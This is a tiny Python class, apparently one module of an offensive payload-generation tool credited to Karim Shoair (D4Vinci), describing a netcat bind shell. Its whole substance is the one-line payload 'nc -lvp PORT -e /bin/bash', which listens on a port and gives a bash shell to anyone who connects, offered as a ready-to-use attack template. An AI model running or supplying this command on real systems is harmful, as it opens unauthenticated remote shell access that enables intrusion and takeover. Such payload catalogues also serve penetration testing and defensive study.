class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses netcat tool to setup a bind shell"
    function    = "bind shell"
    liner       = "nc -lvp PORT -e /bin/bash"
